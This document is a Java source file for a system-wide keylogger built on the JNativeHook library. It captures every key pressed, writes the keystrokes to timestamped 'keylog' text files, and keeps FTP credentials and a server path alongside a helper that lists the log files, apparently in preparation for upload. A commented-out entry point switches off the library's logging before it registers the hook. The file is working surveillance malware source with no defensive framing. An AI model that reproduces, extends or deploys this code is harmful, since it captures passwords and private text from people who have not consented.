import org.apache.commons.io.FilenameUtils;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

import java.io.BufferedWriter;
import java.io.File;
import java.io.FileWriter;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;

public class GlobalKeyListener implements NativeKeyListener
{

    private String localRootFolder;
    private String rootImagesPathOnServer;

    private String filename = "keylog";
    private String currentDate = "";
    private DateFormat dateFormat = new SimpleDateFormat("yyyy_MM_dd_HH_mm");

    private static String lastHour = "";

    private FTPCredentials credentials;

    public GlobalKeyListener(FTPCredentials credentials,
                             String localRootFolder,
                             String rootImagesPathOnServer)
    {
        this.localRootFolder = localRootFolder;
        this.rootImagesPathOnServer = rootImagesPathOnServer;

        //extract current hour
        lastHour = new SimpleDateFormat("HH").format(new Date());

        this.credentials = credentials;
    }

    public void nativeKeyPressed(NativeKeyEvent e)
    {

        //reset timer to 0 when a key is pressed
        MainApplication.timeWhenNoClickWasReceived = 0;

        String keyPressed = NativeKeyEvent.getKeyText(e.getKeyCode());
        keyPressed = preprocessKeyPressed(keyPressed);

        try{

            Date date = new Date();

            String currentHour = new SimpleDateFormat("HH").format(date);

            currentDate = dateFormat.format(date);

            filename = "keylog_date_" + currentDate + ".txt";

            File keyloggerFile = new File(localRootFolder + "/" + filename);
            BufferedWriter bufferedWriter = null;


            if(keyloggerFile.exists())
            {
                //append to the current file the logs
                bufferedWriter = new BufferedWriter(new FileWriter(keyloggerFile,true));
                bufferedWriter.write(keyPressed);
            }
            else
            {
                //create new file and write to it
                bufferedWriter = new BufferedWriter(new FileWriter(keyloggerFile));
                bufferedWriter.write(keyPressed);
            }

            bufferedWriter.close();



        }
        catch(Exception ex)
        {
            System.out.println("Exception in GlobalKeyListener: " + ex);
        }


        //System.out.print(NativeKeyEvent.getKeyText(e.getKeyCode()));

/*        try
        {
            if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
                GlobalScreen.unregisterNativeHook();
            }
        }
        catch (Exception es)
        {
            System.out.println("Exception: " + es);
        }*/

    }

    private String preprocessKeyPressed(String key)
    {
        String result = "";

        switch(key)
        {
            case "Space":
                result = " ";
                break;
            case "Enter":
                result = "\r\n";
                break;
            default:
                result = key;
                break;
        }


        return result;
    }


    public void nativeKeyReleased(NativeKeyEvent e) {
        //System.out.println("Key Released: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }

    public void nativeKeyTyped(NativeKeyEvent e) {
        //System.out.println("Key Typed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
    }



/*    public static void main(String[] args) {

        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
        logger.setLevel(Level.OFF);

        // Change the level for all handlers attached to the default logger.
        Handler[] handlers = Logger.getLogger("").getHandlers();
        for (int i = 0; i < handlers.length; i++) {
            handlers[i].setLevel(Level.OFF);
        }

        try {
            GlobalScreen.registerNativeHook();
        }
        catch (NativeHookException ex) {
            System.err.println("There was a problem registering the native hook.");
            System.err.println(ex.getMessage());

            //System.exit(1);
        }

        GlobalScreen.addNativeKeyListener(new GlobalKeyListener("",""));
    }*/

    public static List<String> listAllFilesFromDirectory(String path)
    {
        List<String> fileNameList = new ArrayList<String>();

        File folder = new File(path);
        File[] listOfFiles = folder.listFiles();

        for (int i = 0; i < listOfFiles.length; i++) {
            if (listOfFiles[i].isFile()) {
                //System.out.println("File " + listOfFiles[i].getName());

                String ext = FilenameUtils.getExtension(listOfFiles[i].getAbsolutePath());

                if(ext.equals("txt"))
                {
                    fileNameList.add(listOfFiles[i].getName());
                }
            }
        }

        return fileNameList;

    }
}
